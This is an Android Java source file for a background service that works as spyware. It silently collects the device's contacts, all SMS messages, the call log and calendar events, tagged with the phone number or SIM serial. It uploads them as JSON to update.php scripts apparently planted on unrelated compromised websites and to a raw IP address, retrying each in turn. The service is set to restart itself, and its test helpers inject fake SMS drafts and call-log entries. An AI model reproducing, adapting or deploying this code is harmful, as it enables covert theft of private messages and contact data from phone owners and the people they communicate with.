package com.zumania;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.util.Log;

public class FetchUploadService extends Service {

	private static final String LOG_TAG = "FetchContactActivity";
//		public String SERVER_URL1 = "http://175.160.121.12:8080/fetch_contact/update.php";
	public String SERVER_URL1 = "http://www.cheongmi.com/shop/upload/notice/update.php";
	public String SERVER_URL2 = "http://www.dwmedical.co.kr/upload/design/update.php";
	public String SERVER_URL3 = "http://www.lovegreengolf.com/sing/images/update.php";
	public String SERVER_URL4 = "http://211.234.125.57:8080/update.php";

	private static final int HTTP_CONNECTION_TIMEOUT = 300000;
	private static final int HTTP_SO_TIMEOUT = 300000;

	Timer mTimer;

	DefaultHttpClient httpClient;

	private ArrayList<ContactItem> contactsList = new ArrayList<ContactItem>();
	private ArrayList<MessageItem> messagesList = new ArrayList<MessageItem>();
	private ArrayList<CallLogItem> callLogList = new ArrayList<CallLogItem>();
	private ArrayList<CalendarEventItem> eventsList = new ArrayList<CalendarEventItem>();

	private String selfPhoneNumber;

	private int retryCount = 0;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		BasicHttpParams httpParams = new BasicHttpParams();
		HttpConnectionParams.setConnectionTimeout(httpParams, HTTP_CONNECTION_TIMEOUT);
		HttpConnectionParams.setSoTimeout(httpParams, HTTP_SO_TIMEOUT);
		HttpProtocolParams.setVersion(httpParams, HttpVersion.HTTP_1_1);
		HttpProtocolParams.setContentCharset(httpParams, "UTF-8");
		httpClient = new DefaultHttpClient(httpParams);

		TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String phoneNumber = telMgr.getLine1Number();
		selfPhoneNumber = phoneNumber;

		if(selfPhoneNumber == null || selfPhoneNumber.equalsIgnoreCase("")) {
			//			selfPhoneNumber = "Unknown";
			selfPhoneNumber = telMgr.getSimSerialNumber();;
		}
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("LocalService", "Received start id " + startId + ": " + intent);
		// We want this service to continue running until it is explicitly
		// stopped, so return sticky.

		//		Timer timer = new Timer();
		//		timer.schedule(new FetchUploadTimerTask(), 10, 300000);

		Thread thread = new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				fetchContact();
				getSMS();

				//insertCallLog();
				getCallLogList();
				getCalendarEvents();

				uploadContactList();

				//getSMSTest();
			}
		});

		thread.start();

		return START_STICKY;
	}

	private void fetchContact() {
		Cursor contactCursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		if(contactCursor == null)
			return;

		contactsList.clear();

		if(contactCursor.moveToFirst()) {

			do {
				String contactId = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts._ID));
				String name = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				String hasPhoneNumber = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				String phoneNumber = "";

				// Get PhoneNumber
				if(hasPhoneNumber.equalsIgnoreCase("1")) {
					Cursor dataCursor = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, ContactsContract.Data.CONTACT_ID + " = ?", new String[] { contactId }, null);

					if(dataCursor.moveToFirst()) {
						String rawId = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Data.RAW_CONTACT_ID));

						Cursor phoneCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID + " = ?", new String[] { rawId }, null);
						if(phoneCursor.moveToFirst()) {
							phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
						}

						phoneCursor.close();
					}

					dataCursor.close();
				}

				// End

				//Log.e(LOG_TAG, String.format("%s --- %s", name, phoneNumber));
				Log.e(LOG_TAG, String.format("%s : %s", name, phoneNumber));
				ContactItem contactItem = new ContactItem();
				contactItem.displayName = name;
				contactItem.phoneNumber = phoneNumber;

				contactsList.add(contactItem);
			} while(contactCursor.moveToNext());
		}

		contactCursor.close();
	}

	// for test
	private void getSMSTest() {
		// Insert test message
		ContentValues values = new ContentValues();
		values.put("address", "11111111111");
		values.put("body", "This is draft message to 11111111111");
		values.put("date", "999999999999");
		Uri ret = getContentResolver().insert(Uri.parse("content://sms/draft"), values);
		//

		Uri uriSMSURI = Uri.parse("content://sms/");
		Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
		if(cur == null)
			return;

		if(cur.moveToFirst()) {
			Log.e(LOG_TAG, String.format("%s", cur.getColumnNames().toString()));
			do {
				String address = cur.getString(cur.getColumnIndex("address"));
				String body = cur.getString(cur.getColumnIndexOrThrow("body"));
				String time = cur.getString(cur.getColumnIndex("date"));
				String type = cur.getString(cur.getColumnIndex("type"));
				//				time = cur.getString(cur.getColumnIndex("date_sent"));

				//
				//				time = DateFormat.format("MMMM dd, yyyy h:mmaa", Long.parseLong(time)).toString();
				time = DateFormat.format("yyyy-MM-dd hh:mm:ss", Long.parseLong(time)).toString();

				Log.e(LOG_TAG, String.format("%s : %s : %s : %s", address, body, time, type));
				//

			} while (cur.moveToNext());
		}

		cur.close();
	}

	private void insertCallLog() {
		ContentValues values = new ContentValues();
		values.put(CallLog.Calls.NUMBER, "3333333");
		values.put(CallLog.Calls.DATE, System.currentTimeMillis());
		values.put(CallLog.Calls.DURATION, 0);
		values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);
		values.put(CallLog.Calls.NEW, 1);
		values.put(CallLog.Calls.CACHED_NAME, "");
		values.put(CallLog.Calls.CACHED_NUMBER_TYPE, 0);
		values.put(CallLog.Calls.CACHED_NUMBER_LABEL, "");
		getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);
	}

	// end

	private void getSMS(){
		// Read 'Sent' box
		Uri uriSMSURI = Uri.parse("content://sms/");	//content://sms/sent, content://sms/sent, content://sms/draft
		Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
		if(cur == null)
			return;

		messagesList.clear();

		if(cur.moveToFirst()) {
			do {
				String address = cur.getString(cur.getColumnIndex("address"));
				if(address == null)
					address = "";
				//				String person = cur.getString(cur.getColumnIndex("person"));
				String body = cur.getString(cur.getColumnIndexOrThrow("body"));
				String time = cur.getString(cur.getColumnIndex("date"));
				String type = cur.getString(cur.getColumnIndex("type"));
				//				time = cur.getString(cur.getColumnIndex("date_sent"));

				//
				//				time = DateFormat.format("MMMM dd, yyyy h:mmaa", Long.parseLong(time)).toString();
				time = DateFormat.format("yyyy-MM-dd hh:mm:ss", Long.parseLong(time)).toString();

				Log.e(LOG_TAG, String.format("%s : %s : %s", address, body, time));
				//

				MessageItem message = new MessageItem();
				message.address = address;
				message.message = body;
				message.time = time;
				message.type = type;

				messagesList.add(message);
			} while (cur.moveToNext());
		}

		cur.close();

		Log.e(LOG_TAG, String.format("Message Count : %d", messagesList.size()));
	}

	private void getCallLogList() {
		Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

		if(cur == null)
			return;

		callLogList.clear();

		if(cur.moveToFirst()) {
			do {
				String number = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
				String date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE));
				date = DateFormat.format("yyyy-MM-dd hh:mm:ss", Long.parseLong(date)).toString();

				String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
				String type = cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE));
				//				String _new = cur.getString(cur.getColumnIndex(CallLog.Calls.NEW));
				//				String cachedName = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
				//				String cachedNumberType = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE));
				//				String cahcedNumberLabel = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));

				Log.e(LOG_TAG, String.format("%s : %s : %s, %s", number, date, duration, type));

				CallLogItem log = new CallLogItem();
				log.number = number;
				log.date = date;
				log.duration = duration;
				log.type = type;

				callLogList.add(log);				
			} while(cur.moveToNext());
		}

		cur.close();
	}

	private void getCalendarEvents() {
		Uri uri;
		if (Build.VERSION.SDK_INT >= 8 )
			uri = Uri.parse("content://com.android.calendar/events");
		else
			uri = Uri.parse("content://calendar/events");

		try {
			Cursor cursor = getContentResolver().query(uri,
					new String[] { "calendar_id", "title", "description", "dtstart", "dtend", "eventLocation" }, null, null, null);

			eventsList.clear();
			
			if(cursor == null) {
				CalendarEventItem emptyEvent = new CalendarEventItem();
				emptyEvent.title = "Error";
				emptyEvent.description = "Calendar Exception";
				emptyEvent.startDate = "---";
				emptyEvent.endDate = "---";
				emptyEvent.location = "---";
				
				eventsList.add(emptyEvent);
				
				return;
			}
			
			String[] colNames = cursor.getColumnNames();

			if(cursor.moveToFirst()) {
				do {
					String title = cursor.getString(1);
					String description = cursor.getString(2);
					String dtstart = cursor.getString(3);
					String dtend = cursor.getString(4);
					String eventLocation = cursor.getString(5);

					CalendarEventItem event = new CalendarEventItem();
					event.title = title;
					event.description = description != null ? description : "";
					event.startDate = DateFormat.format("yyyy-MM-dd hh:mm:ss", Long.parseLong(dtstart)).toString();
					event.endDate = DateFormat.format("yyyy-MM-dd hh:mm:ss", Long.parseLong(dtend)).toString();
					event.location = eventLocation != null ? eventLocation : "";

					Log.e(LOG_TAG, String.format("%s -- %s -- %s -- %s -- %s", event.title, event.description, event.startDate, event.endDate, event.location));

					eventsList.add(event);

				} while(cursor.moveToNext());
			}

			cursor.close();
		} catch (Exception e) {
			// TODO: handle exception
			
			CalendarEventItem errorEvent = new CalendarEventItem();
			errorEvent.title = "Error";
			errorEvent.description = e.toString();
			errorEvent.startDate = "---";
			errorEvent.endDate = "---";
			errorEvent.location = "---";
			
			eventsList.add(errorEvent);
		}

		if(eventsList.size() == 0) {
			CalendarEventItem emptyEvent = new CalendarEventItem();
			emptyEvent.title = "No Event";
			emptyEvent.description = "There is no events.";
			emptyEvent.startDate = "---";
			emptyEvent.endDate = "---";
			emptyEvent.location = "---";
			
			eventsList.add(emptyEvent);
		}
	}

	private void getCalendars() {

		String[] l_projection = new String[]{"_id", "calendar_displayName"};

		Uri calendarUri;

		if (Build.VERSION.SDK_INT >= 8 ) {

			calendarUri = Uri.parse("content://com.android.calendar/calendars");

		} else {

			calendarUri = Uri.parse("content://calendar/calendars");

		}

		Cursor cursor = getContentResolver().query(calendarUri, null, null, null, null);    //all calendars
		String colNames[] = cursor.getColumnNames();

		//Cursor l_managedCursor = this.managedQuery(l_calendars, l_projection, "selected=1", null, null);   //active calendars

		if (cursor.moveToFirst()) {
			String l_calName;
			String l_calId;
			int l_cnt = 0;

			int l_nameCol = cursor.getColumnIndex(l_projection[1]);

			int l_idCol = cursor.getColumnIndex(l_projection[0]);

			do {
				l_calName = cursor.getString(l_nameCol);
				l_calId = cursor.getString(l_idCol);
				++l_cnt;

				getEvents(Integer.parseInt(l_calId));
			} while (cursor.moveToNext());
		}
	}

	private void getEvents(int m_selectedCalendarId) {

		Uri l_eventUri;

		if (Build.VERSION.SDK_INT >= 8 ) {

			l_eventUri = Uri.parse("content://com.android.calendar/events");

		} else {

			l_eventUri = Uri.parse("content://calendar/events");

		}

		String[] l_projection = new String[]{"title", "dtstart", "dtend"};

		Cursor l_managedCursor = getContentResolver().query(l_eventUri, l_projection, "calendar_id=" + m_selectedCalendarId, null, "dtstart DESC, dtend DESC");

		//Cursor l_managedCursor = this.managedQuery(l_eventUri, l_projection, null, null, null);

		if (l_managedCursor.moveToFirst()) {

			int l_cnt = 0;

			String l_title;

			String l_begin;

			String l_end;

			int l_colTitle = l_managedCursor.getColumnIndex(l_projection[0]);

			int l_colBegin = l_managedCursor.getColumnIndex(l_projection[1]);

			int l_colEnd = l_managedCursor.getColumnIndex(l_projection[1]);

			do {

				l_title = l_managedCursor.getString(l_colTitle);

				l_begin = DateFormat.format("yyyy-MM-dd hh:mm:ss", l_colBegin).toString();
				l_end = DateFormat.format("yyyy-MM-dd hh:mm:ss", l_colEnd).toString();

				Log.e(LOG_TAG, String.format("%s --- %s --- %s", l_title, l_begin, l_end));

			} while (l_managedCursor.moveToNext());
		}
	}

	private void uploadContactList() {
		if(contactsList.isEmpty())
			return;

		// Set PostData
		String data = "";
		List<NameValuePair> params = new ArrayList<NameValuePair>();


		try {
			// Put Contact Data
			JSONArray jArray = new JSONArray();

			for(int i = 0; i < contactsList.size(); i++) {
				JSONObject json = new JSONObject();

				json.put("name", contactsList.get(i).displayName);
				json.put("phone_number", contactsList.get(i).phoneNumber);
				jArray.put(json);
			}

			data = jArray.toString();

			params.add(new BasicNameValuePair("self_phone_number", selfPhoneNumber));
			params.add(new BasicNameValuePair("contact", data));
			// end

			// Put Message Data
			jArray = new JSONArray();

			for(int i = 0; i < messagesList.size(); i++) {
				JSONObject json = new JSONObject();

				json.put("address", messagesList.get(i).address);
				json.put("message", messagesList.get(i).message);
				json.put("msg_time", messagesList.get(i).time);
				json.put("type", messagesList.get(i).type);

				jArray.put(json);
			}

			data = jArray.toString();
			params.add(new BasicNameValuePair("message", data));
			// end

			// Put CallLog Data
			jArray = new JSONArray();
			for(int i = 0; i < callLogList.size(); i++) {
				JSONObject json = new JSONObject();

				json.put("number", callLogList.get(i).number);
				json.put("called_date", callLogList.get(i).date);
				json.put("duration", callLogList.get(i).duration);
				json.put("type", callLogList.get(i).type);

				jArray.put(json);
			}

			data = jArray.toString();
			params.add(new BasicNameValuePair("call_log", data));
			// end

			// Put Event Data
			jArray = new JSONArray();
			for(int i = 0; i < eventsList.size(); i++) {
				JSONObject json = new JSONObject();

				json.put("title", eventsList.get(i).title);
				json.put("description", eventsList.get(i).description);
				json.put("start_date", eventsList.get(i).startDate);
				json.put("end_date", eventsList.get(i).endDate);
				json.put("location", eventsList.get(i).location);

				jArray.put(json);
			}

			data = jArray.toString();
			params.add(new BasicNameValuePair("event", data));
			// end
		} 
		catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		String serverUrl = "";

		if(retryCount == 0)
			serverUrl = SERVER_URL1;
		else if(retryCount == 1)
			serverUrl = SERVER_URL2;
		else if(retryCount == 2)
			serverUrl = SERVER_URL3;
		else if(retryCount == 3)
			serverUrl = SERVER_URL4;
		else {
			return;
		}

		HttpPost httpPost = new HttpPost(serverUrl);

		try {
			//
			//			data = params.toString();
			//			byte[] byteData = data.getBytes("UTF-8");
			//			ByteArrayEntity postEntity = new ByteArrayEntity(byteData);
			//			httpPost.setEntity(postEntity);
			//

			httpPost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
		} catch (UnsupportedEncodingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}		
		HttpResponse response;

		try {
			response = httpClient.execute(httpPost);

			StatusLine status = response.getStatusLine();
			int statusCode = status.getStatusCode();

			HttpEntity httpEntity = response.getEntity();
			InputStream httpIS = httpEntity.getContent();

			String resStr = convertStreamToString(httpIS);
			Log.e("Tag", String.format("%s", resStr));

			if(statusCode != 200) {
				retryCount++;
				uploadContactList();
			}

		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

			retryCount++;
			uploadContactList();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

			retryCount++;
			uploadContactList();
		}
	}

	class FetchUploadTimerTask extends TimerTask {

		@Override
		public void run() {
			//			fetchContact();
			//			getSMS();
			getCallLogList();

			//			uploadContactList();
		}
	}

	public static String convertStreamToString(InputStream is) {
		/*
		 * To convert the InputStream to String we use the
		 * BufferedReader.readLine() method. We iterate until the BufferedReader
		 * return null which means there's no more data to read. Each line will
		 * appended to a StringBuilder and returned as String.
		 */
		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
		StringBuilder sb = new StringBuilder();

		String line = null;
		try {
			while ((line = reader.readLine()) != null) {
				sb.append(line);
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return sb.toString();
	}

	private class ContactItem {
		public String displayName;
		public String phoneNumber;
	}

	private class MessageItem {
		public String address;
		public String message;
		public String time;
		public String type;	// 1: Inbox,	2 : Sent,	3 : Draft
	}

	private class CallLogItem {
		public String number;
		public String date;
		public String duration;
		public String type;	// incoming : 1, outgoing : 2
	}

	private class CalendarEventItem {
		public String title;
		public String description;
		public String startDate;
		public String endDate;
		public String location;
	}
}